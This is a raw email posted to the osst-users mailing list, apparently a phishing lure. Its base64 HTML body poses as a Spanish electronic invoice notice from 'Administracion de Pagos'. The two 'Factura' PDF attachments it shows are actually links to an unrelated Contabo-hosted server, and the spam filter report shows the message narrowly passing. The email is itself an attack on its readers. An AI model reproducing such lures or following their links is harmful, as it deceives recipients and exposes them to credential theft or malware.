Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id B987CADECB5
	for <lists+osst-users@lfdr.de>; Wed, 18 Jun 2025 14:39:27 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Date:Message-Id:To:
	From:MIME-Version:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
	:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=q8UikYlLFNBcv4etZDVxO+WfTf/lEULDLll59g5Wmqc=; b=LLfCHtl3+LaQeFK9eP/1sp/G9T
	S+BW/989ki10Ao8xq11+HCH9dEWM5LPIPCecVe+c26etPsED48qbIeeSEiOY/rchH8fSlQBQkdYsD
	4AzE7ipkhgYEC3jwJFP/WO3m4j2FTSZx7/wibhXD59+xG4ceBr7FmBkM1UuBtBxcMNGE=;
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1uRs4c-0001mr-Ib
	for lists+osst-users@lfdr.de;
	Wed, 18 Jun 2025 12:39:26 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <root@cv31.smandess.com>) id 1uRs4b-0001mh-7w
 for osst-users@lists.sourceforge.net; Wed, 18 Jun 2025 12:39:25 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Date:Message-Id:To:From:Subject:
 Content-Transfer-Encoding:Content-type:MIME-Version:Sender:Reply-To:Cc:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=3SbwWZ7qVmytDuFmyR7wzlbFZLLf8n4l5yQMqaVqKOI=; b=iQoibzZNjeTkCJUOuAtyTIAqAl
 AWitEbXbHNQ8O115+kR8LfZfhGPhLb6jJCRHCIj4V7K1EbryXT7Nmqpqwriv7ZntNcxf6NoWeuvge
 lnNl6aCsxTZapzOS4Ft2znSDZukrrzQ0gAR8/ltqxbgMUPh33e+FKSTbcrxgPb9BmA7U=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Date:Message-Id:To:From:Subject:Content-Transfer-Encoding:Content-type:
 MIME-Version:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=3SbwWZ7qVmytDuFmyR7wzlbFZLLf8n4l5yQMqaVqKOI=; b=d
 YWCSV1fv2H9tRiHbEjCQDZV27SM5xSQPJ+8ttynAHukkhewxmC3y8Ql53+MK0qbkRnILBQjC9+jhS
 lLVoGhCVs1779N1nZnIOzruQDYfi0h9hqoGFp7u+ZhPUg3zmQDUNhcw2rDFMsD+x/6XXiDw0nC9lv
 j0brqtbjAakBGpjM=;
Received: from cv31.smandess.com ([216.9.226.234])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1uRs4a-0006X1-LF for osst-users@lists.sourceforge.net;
 Wed, 18 Jun 2025 12:39:25 +0000
Received: by cv31.smandess.com (Postfix, from userid 0)
 id F002489E42; Wed, 18 Jun 2025 12:32:41 +0000 (UTC)
MIME-Version: 1.0
From: Administracion de Pagos <cobranzayfacturacion@vps-e0fc7fe3.vps.ovh.net>
To: osst-users@lists.sourceforge.net
Message-Id: <20250618123241.F002489E42@cv31.smandess.com>
Date: Wed, 18 Jun 2025 12:32:41 +0000 (UTC)
X-Spam-Score: 4.9 (++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: reenvio-01 RE-9292866849228Factura.pdf(~51 KB)
 Factura92928668462761239922848805.pdf(~51 KB) 
 Content analysis details:   (4.9 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 4.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [216.9.226.234 listed in dnsbl-1.uceprotect.net]
 0.8 DKIM_ADSP_NXDOMAIN     No valid author signature and domain not in DNS
 0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
 domains are different
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
X-Headers-End: 1uRs4a-0006X1-LF
Subject: [Osst-users] Su Factura Electronica ha sido Emitida - 9553738
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============1669507265756482497=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============1669507265756482497==
Content-type: text/html; charset=UTF-8
Content-Transfer-Encoding: base64

PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFs
Ly9FTiI+DQoKPGh0bWw+DQoKPGhlYWQ+DQoKDQoKDQoKICANCgogIDxtZXRhIGNvbnRlbnQ9InRl
eHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIiBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiPg0K
Cg0KCiAgDQoKICA8dGl0bGU+cmVlbnZpby0wMTwvdGl0bGU+DQoKPC9oZWFkPg0KCg0KCg0KCjxi
b2R5Pg0KCg0KCg0KCjxkaXYgaWQ9Im1lc3NhZ2UtY29udGVudCI+DQoKPGRpdiBjbGFzcz0ibGVm
dGNvbCIgcm9sZT0icmVnaW9uIiBhcmlhLWxhYmVsbGVkYnk9ImFyaWEtbGFiZWwtbWVzc2FnZWF0
dGFjaG1lbnRzIj4gPGJyPg0KCg0KCg0KCjx1bD4NCgoNCgogIDxsaT48YSBocmVmPSJodHRwczov
L3ZtaTI2NjE4ODguY29udGFib3NlcnZlci5uZXQvP190YXNrPW1haWwmYW1wO19hY3Rpb249Z2V0
JmFtcDtfbWJveD1JTkJPWCZhbXA7X3VpZD00Mjc3NyZhbXA7X3Rva2VuPTVmZjM2MGRmYmNkOTYy
OTJmMDNiOWRhMWM5Yjk3NTFjNGExNWFiYjJhNjNhZWRjNmY4NTE1NDhlN2YyNTA3NTYmYW1wO19w
YXJ0PTUuMC41JmFtcDtfZW1iZWQ9MSZhbXA7X21pbWVjbGFzcz1pbWFnZSIgb25jbGljaz0icmNt
YWlsLmNvbW1hbmQoJ2xvYWQtYXR0YWNobWVudCcsJzInLHRoaXMpOyByZXR1cm4gZmFsc2UiIG9u
bW91c2VvdmVyPSJyY3ViZV93ZWJtYWlsLmxvbmdfc3ViamVjdF90aXRsZV9leCh0aGlzLCAwKSIg
dGl0bGU9IiIgY2xhc3M9ImZpbGVuYW1lIj48c3BhbiBjbGFzcz0iYXR0YWNobWVudC1uYW1lIj5S
RS05MjkyODY2ODQ5MjI4RmFjdHVyYS5wZGY8L3NwYW4+PHNwYW4gY2xhc3M9ImF0dGFjaG1lbnQt
c2l6ZSI+KH41MSBLQik8L3NwYW4+PC9hPjwvbGk+DQoKDQoKPC91bD4NCgoNCgo8dWw+DQoKDQoK
ICA8bGk+PGEgaHJlZj0iaHR0cHM6Ly92bWkyNjYxODg4LmNvbnRhYm9zZXJ2ZXIubmV0Lz9fdGFz
az1tYWlsJmFtcDtfYWN0aW9uPWdldCZhbXA7X21ib3g9SU5CT1gmYW1wO191aWQ9NDI3NzcmYW1w
O190b2tlbj01ZmYzNjBkZmJjZDk2MjkyZjAzYjlkYTFjOWI5NzUxYzRhMTVhYmIyYTYzYWVkYzZm
ODUxNTQ4ZTdmMjUwNzU2JmFtcDtfcGFydD01LjAuNSZhbXA7X2VtYmVkPTEmYW1wO19taW1lY2xh
c3M9aW1hZ2UiIG9uY2xpY2s9InJjbWFpbC5jb21tYW5kKCdsb2FkLWF0dGFjaG1lbnQnLCczJyx0
aGlzKTsgcmV0dXJuIGZhbHNlIiBvbm1vdXNlb3Zlcj0icmN1YmVfd2VibWFpbC5sb25nX3N1Ympl
Y3RfdGl0bGVfZXgodGhpcywgMCkiIHRpdGxlPSIiIGNsYXNzPSJmaWxlbmFtZSI+PHNwYW4gY2xh
c3M9ImF0dGFjaG1lbnQtbmFtZSI+RmFjdHVyYTkyOTI4NjY4NDYyNzYxMjM5OTIyODQ4ODA1LnBk
Zjwvc3Bhbj48c3BhbiBjbGFzcz0iYXR0YWNobWVudC1zaXplIj4ofjUxIEtCKTwvc3Bhbj48L2E+
PC9saT4NCgoNCgo8L3VsPg0KCg0KCjx1bCBpZD0iYXR0YWNobWVudC1saXN0IiBjbGFzcz0iYXR0
YWNobWVudHNsaXN0Ij4NCgoNCgoNCgoNCgoNCgo8L3VsPg0KCg0KCg0KCjwvZGl2Pg0KCg0KCg0K
CjxkaXYgY2xhc3M9InJpZ2h0Y29sIiByb2xlPSJyZWdpb24iIGFyaWEtbGFiZWxsZWRieT0iYXJp
YS1sYWJlbC1tZXNzYWdlYm9keSI+DQoKPGRpdiBpZD0ibWVzc2FnZS1vYmplY3RzIj48YnI+DQoK
DQoKPGJyPg0KCg0KCjwvZGl2Pg0KCg0KCg0KCjxkaXYgaWQ9Im1lc3NhZ2Vib2R5Ij4NCgo8ZGl2
IGNsYXNzPSJtZXNzYWdlLXBhcnQiIGlkPSJtZXNzYWdlLXBhcnQxIj4NCgo8ZGl2IGNsYXNzPSJw
cmUiPlNyLiBvc3N0LXVzZXJzQGxpc3RzLnNvdXJjZWZvcmdlLm5ldA0KOiBBZGp1bnRvIGVsIFJl
Y2libw0KCk4mb3JkbTsgOTI5Mjg2Njg0OTIyODg4ODc5OTIzMDk8L2Rpdj4NCgoNCgoNCgo8L2Rp
dj4NCgoNCgoNCgo8L2Rpdj4NCgoNCgoNCgo8L2Rpdj4NCgoNCgoNCgo8L2Rpdj4NCgoNCgoNCgo8
L2JvZHk+DQoKPC9odG1sPg0K




--===============1669507265756482497==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1669507265756482497==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============1669507265756482497==--
